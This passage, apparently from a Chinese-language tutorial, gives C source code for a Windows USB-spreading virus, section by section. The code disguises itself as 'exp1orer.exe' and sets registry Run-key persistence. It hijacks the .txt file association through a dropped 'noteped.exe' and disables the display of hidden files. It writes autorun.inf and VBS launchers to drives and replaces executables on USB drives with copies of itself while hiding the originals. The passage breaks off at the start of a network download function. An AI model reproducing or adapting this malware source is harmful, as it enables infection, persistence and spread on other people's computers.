
```c
RegSetValueEx(hKey,"exp1orer",0,REG_SZ,(BYTE *)filepath,lstrlen(filepath));

filepath[3]='\0';

strcat(filepath,"Program Files\\exp1orer.exe");

RegSetValueEx(hKey,"exp1orer",0,REG_SZ,(BYTE *)filepath,lstrlen(filepath));

filepath[3]='\0';

strcat(filepath,"exp1orer.exe");

RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);

RegSetValueEx(hKey,"exp1orer",0,REG_SZ,(BYTE *)filepath,lstrlen(filepath));

memset(filepath,0,MAX_PATH);

GetWindowsDirectory(filepath,MAX_PATH);

strcat(filepath,"\\noteped.exe %1");

//修改txt文件关联

RegCreateKey(HKEY_CLASSES_ROOT,"txtfile\\shell\\open\\command",&hKey);

RegSetValueEx(hKey,"",0,REG_SZ,(BYTE *)filepath,lstrlen(filepath));

value=243;

RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",&hKey);

RegSetValueEx(hKey,"NoDriveTypeAutoRun",0,REG_DWORD,(BYTE *)&value,sizeof(DWORD));

//使显示隐藏文件无效

value=0;

RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL",&hKey);

RegSetValueEx(hKey,"CheckedValue",0,REG_DWORD,(BYTE *)&value,sizeof(DWORD));

value=2;

RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\NOHIDDEN",&hKey);

RegSetValueEx(hKey,"CheckedValue",3,REG_DWORD,(BYTE *)&value,sizeof(DWORD));

}
```

### 把病毒副本复制到系统目录，windows目录并设置程隐藏

```c
void HideFile()
{
        char newfile[MAX_PATH];
        memset(newfile,0,MAX_PATH);
        GetSystemDirectory(newfile,MAX_PATH);
        strcat(newfile,"\\exp1orer.exe");
        CopyFile(localfile,newfile,TRUE);
        SetFileAttributes(newfile,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
        memset(newfile,0,MAX_PATH);
        GetWindowsDirectory(newfile,MAX_PATH);
        strcat(newfile,"\\exp1orer.exe");
        CopyFile(localfile,newfile,TRUE);
        SetFileAttributes(newfile,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
        newfile[3]='\0';
        strcat(newfile,"Program Files\\exp1orer.exe");
        CopyFile(localfile,newfile,TRUE);
        SetFileAttributes(newfile,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
}
```

### 写入autorun.inf文件，使磁盘和U盘自动运行

```c
bool WriteInf(char *infname)
{
        char autorun[MAX_PATH]="[AutoRun]\nopen=wscript.exe system.vbs\nshell\\open\\打开(&O)\nshell\\open\\Command=wscript.exe system.vbs\nshell\\open\\default=1\nshell\\explore\\资源管理器(&X)\nshell\\explore\\Command=wscript.exe system.vbs";
        FILE *fp;
        fp=fopen(infname,"w+");
        if(fp==NULL)
                return FALSE;
        fwrite(autorun,sizeof(char),lstrlen(autorun),fp);
        fclose(fp);
        SetFileAttributes(infname,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
        return TRUE;
}
```

### 写入vbs文件，打开磁盘时候运行病毒的同时打开磁盘

```c
bool WriteVbs(char *vbsname)
{
        char *vbs1={"On Error Resume Next\nDim Wsh\nSet Wsh = WScript.CreateObject(\"WScript.Shell\")\nWsh.Run \"cmd /c explorer "};
        char *vbs2={"\",false,false\nWsh.Run \"exp1orer.exe\",false,false\nWScript.quit"};
        char vbs[MAX_PATH];
        char path[MAX_PATH];
        memset(path,0,MAX_PATH);
        memset(vbs,0,MAX_PATH);
        strcpy(path,vbsname);
        path[3]='\0';
        strcpy(vbs,vbs1);
        strcat(vbs,path);
        strcat(vbs,vbs2);
        FILE *fp;
        fp=fopen(vbsname,"w+");
        if(fp==NULL)
                return FALSE;
        fwrite(vbs,sizeof(char),lstrlen(vbs),fp);
        fclose(fp);
        SetFileAttributes(vbsname,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
        return TRUE;
}
```

### 向windows目录释放noteped.exe文件，劫持txt文件的打开方式

```c
void ReleaseNoteped()
{
        DWORD written;
        char windows[MAX_PATH];
        memset(windows,0,MAX_PATH);
        GetWindowsDirectory(windows,MAX_PATH);
        strcat(windows,"\\noteped.exe");
        HANDLE hFile=CreateFile(windows,GENERIC_WRITE,NULL,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL);
        WriteFile(hFile,node,sizeof(node),&written,NULL);
        FlushFileBuffers(hFile);
        CloseHandle(hFile);
}
```

### 感染U盘，把U盘里可执行文件替换为病毒文件，把原文件名后面加上空格并隐藏，这里需要掌握的是磁盘的遍历方法。。。

```c
bool InfectU(char *UDiskName)
{
        WIN32_FIND_DATA winfind;
        HANDLE hFile;
        char path[MAX_PATH];
        char newpath[MAX_PATH];
        char newname[MAX_PATH];
        char oldname[MAX_PATH];
        char filename[MAX_PATH];
        strcpy(path,UDiskName);
        strcat(path,"\\*.*");
        hFile=FindFirstFile(path,&winfind);
        if(hFile==INVALID_HANDLE_VALUE)
                return false;
        do
        {
                if(strcmp(winfind.cFileName,".")==0||strcmp(winfind.cFileName,"..")==0)
                        continue;
                if(winfind.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY)
                {
                        sprintf(newpath,"%s%s\\",UDiskName,winfind.cFileName);
                        InfectU(newpath);
                }
                if(strstr(winfind.cFileName,".exe")!=NULL && strstr(winfind.cFileName," .exe")==NULL)
                {
                        if(strcmp(winfind.cFileName,"exp1orer.exe")!=0)
                        {
                                left(filename,winfind.cFileName,int(strstr(winfind.cFileName,".exe")-winfind.cFileName));
                                strcpy(newname,UDiskName);
                                strcat(newname,filename);
                                strcat(newname," .exe");
                                strcpy(oldname,UDiskName);
                                strcat(oldname,winfind.cFileName);
                                if(!MoveFileEx(oldname,newname,MOVEFILE_COPY_ALLOWED))
                                        return false;
                                SetFileAttributes(newname,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
                                if(!CopyFile(localfile,oldname,FALSE))
                                        return false;
                                SetFileAttributes(oldname,FILE_ATTRIBUTE_NORMAL);
                        }
                }
        }while(FindNextFile(hFile,&winfind));
        return true;
}
```

### 感染磁盘，写入autorun.inf和vbs脚本

```c
void InfectDisk(char *drive)
{
        char diskfile[MAX_PATH];
        char diskinf[MAX_PATH];
        char diskvbs[MAX_PATH];
        memset(diskfile,0,MAX_PATH);
        memset(diskinf,0,MAX_PATH);
        memset(diskvbs,0,MAX_PATH);
        strcpy(diskfile,drive);
        strcpy(diskinf,drive);
        strcpy(diskvbs,drive);
        strcat(diskfile,"exp1orer.exe");
        strcat(diskinf,"autorun.inf");
        strcat(diskvbs,"system.vbs");
        printf("%s",localfile);
        printf("%s",diskfile);
        CopyFile(localfile,diskfile,TRUE);
        SetFileAttributes(diskfile,FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_HIDDEN);
        WriteInf(diskinf);
        WriteVbs(diskvbs);
}
```

### 取字符串左边N位

```c
char *left(char *dst,char *src, int n)
{
        char *p = src;
        char *q = dst;
        int len = strlen(src);
        if(n>len)
                n = len;
        while(n--)
                *(q++) = *(p++);
        *(q++)='\0';
        return dst;
}
```

### 判断文件是否存在

```c
bool FileExists(char *filename)
{
        HANDLE hFind;
        WIN32_FIND_DATA FindData;
        hFind=FindFirstFile(filename,&FindData);
        if(hFind==INVALID_HANDLE_VALUE)
        {
                return false;
        }
        return true;
}
```

### 利用wininet.h头文件里的与Http有关的API函数实现网络文件的下载（说白了就是从网上读取一段文件然后写入到本地机器）功能

```c
BOOL DownLoadFile(char *url,char *filename)
{
        DWORD byteread=0;
        char buffer[25*1024];
```
